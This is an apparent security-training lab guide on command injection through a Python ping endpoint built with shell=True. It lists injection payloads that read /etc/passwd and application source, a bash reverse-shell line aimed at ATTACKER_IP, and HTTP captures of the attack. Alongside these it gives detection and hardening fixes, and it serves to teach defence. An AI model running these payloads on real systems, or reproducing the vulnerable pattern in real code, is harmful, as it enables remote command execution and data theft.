# Lab 08 — Command Injection

## 📖 Explanation

**Command Injection** lets an attacker execute arbitrary operating system
commands by injecting them into a command string that the server passes
to the shell.

If user input is concatenated into a shell command without sanitisation,
shell metacharacters (`;`, `|`, `&&`, `$(...)`, backticks) let the attacker
append or chain their own commands.

### The vulnerable code

```python
# PING_COUNT_FLAG is "-n" on Windows, "-c" on Linux/macOS — the injection
# vector is the f-string + shell=True, not the flag.
output = subprocess.check_output(
    f"ping {PING_COUNT_FLAG} 3 {target}",
    shell=True,
    ...
)
```

Using `shell=True` with f-string interpolation means the shell interprets
the entire string — including any injected operators.

---

## 🎯 Try It

### 1. Normal usage

Log in, go to **Ping**, enter `8.8.8.8` — you get normal ping output.

### 2. Basic injection — semicolon

Enter: `8.8.8.8; id`

The executed command becomes (Linux target — see the Windows box below):

```bash
ping -c 3 8.8.8.8; id
```

The `id` command runs after ping completes. You'll see the user ID.

### 3. Pipe injection

Enter: `8.8.8.8 | whoami`

```bash
ping -c 3 8.8.8.8 | whoami
```

The pipeline sends ping's output to `whoami` — you only see the username.

### 4. Subshell injection

Enter: `$(cat /etc/passwd | head -5)`

```bash
ping -c 3 $(cat /etc/passwd | head -5)
```

The shell executes the subshell first and passes its output to ping.

### 5. Read source code

Enter: `8.8.8.8; cat /home/fie-admin/Apps/rea/web_sec/app.py | head -50`

### 6. Reverse shell (conceptual — do NOT run in a real environment)

```bash
8.8.8.8; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

> ⚠️ This opens a remote shell. Only try in an isolated lab network.

---

### 🪟 When the app runs on Windows (default lab setup)

`subprocess` with `shell=True` uses `cmd.exe` on Windows, not Bash. So the
command separators are different — `;` is **not** a separator in `cmd.exe`:

| Payload | Runs as | Result |
|---|---|---|
| `8.8.8.8 & whoami` | `ping -n 3 8.8.8.8 & whoami` | ping output **plus** `<MACHINE>\<you>` |
| `8.8.8.8 \| whoami` | pipe | username only (ping output is swallowed) |
| `8.8.8.8 & type C:\Windows\win.ini` | `&` chains commands | ping output + file content (`[fonts]`, …) |
| `8.8.8.8 & dir C:\` | `&` chains commands | ping output + listing of the filesystem root |
| `8.8.8.8; id` | **not** injection on cmd — `8.8.8.8;` is parsed as the hostname | page shows `Ping request could not find host 8.8.8.8;.` |
| `192.0.2.1` | unroutable (TEST-NET-1) | `Command timed out after 10s.` |

The page prints the command's real output/stderr when it fails, so a payload
that doesn't parse explains itself instead of just saying "non-zero exit
status".

The `-n` above is not a typo: `app.py` selects the count flag per platform
(`-n` on Windows, `-c` on Linux/macOS), so normal usage works on both.

PowerShell is *not* the shell in this lab (`shell=True` → `cmd.exe`), so
`;`, `$( )`, and backticks in the payload are inert. Bash-only oddities such
as `/dev/tcp` do not apply on Windows — use it only on Linux targets.

---

## 🔍 Packet Inspection with mitmproxy

Command injection is clearly visible in both the request and response.

### What to look for

**1. Normal ping request**

```http
POST /ping HTTP/1.1
Host: 127.0.0.1:15000
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

target=8.8.8.8
```

**2. Command injection attack**

```http
POST /ping HTTP/1.1
Host: 127.0.0.1:15000

target=8.8.8.8%3B+id
```

Note: `%3B` is URL-encoded `;`. The decoded body is:
`target=8.8.8.8;id`

**3. The response**

The response contains not just ping output, but the output of `id`:

```http
HTTP/1.1 200 OK

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
...
uid=1000(fie-admin) gid=1000(fie-admin) groups=1000(fie-admin)
```

The fact that `uid=1000` appears in what's supposed to be ping output is
the smoking gun.

### Try different separators

Watch how each appears on the wire:

| Payload | URL-encoded | What it does |
|---------|-------------|--------------|
| `; id` | `%3B+id` | Command separator |
| `\` | `%7C+whoami` | Pipe to another command |
| `$(whoami)` | `%24(whoami)` | Subshell expansion |
| `` `whoami` `` | `` %60whoami%60 `` | Backtick subshell |

### Use the addon

```bash
uv run mitmweb -s mitm_addon.py    # identical in PowerShell — uv resolves the venv
```

The addon flags any POST to `/ping` containing `;`, `|`, `$`, or backticks
with a `[Command Injection]` tag.

---

## 🛡️ Hardening

### Fix 1 — Never use `shell=True` with user input

Use the **list form** of `subprocess` calls:

```python
import subprocess

subprocess.run(
    ["ping", "-c", "3", target],
    capture_output=True,
    text=True,
    timeout=10
)
```

When arguments are passed as a list, the shell **never interprets**
metacharacters — they are literal arguments to the command.

### Fix 2 — Validate and whitelist input

```python
import re
if not re.match(r'^[a-zA-Z0-9\.\-_]+$', target):
    return "Invalid target", 400
```

### Fix 3 — Use a library instead of shelling out

For ping: use `python-ping` or `icmplib`.
For DNS: use `socket.gethostbyname()`.
For HTTP: use `requests`.

```python
from icmplib import ping as icmp_ping

host = icmp_ping(target, count=3, timeout=5)
output = f"Packets sent: 3, received: {host.packets_received}"
```

### Fix 4 — Use `shlex.quote()` as a last resort

If you absolutely must use `shell=True` (legacy system), quote the input:

```python
import shlex
safe_target = shlex.quote(target)   # note: quote() is POSIX — on Windows use
                                    # a whitelist check instead
output = subprocess.check_output(f"ping {PING_COUNT_FLAG} 3 {safe_target}", shell=True)
```

But treat this as a temporary fix, not a permanent solution.

### Fix 5 — Drop `shell=True` entirely

In almost every case, using list arguments eliminates the injection
vector completely.

### Key takeaway

> Avoid `shell=True` whenever possible. Pass arguments as a list
> to prevent the shell from interpreting metacharacters.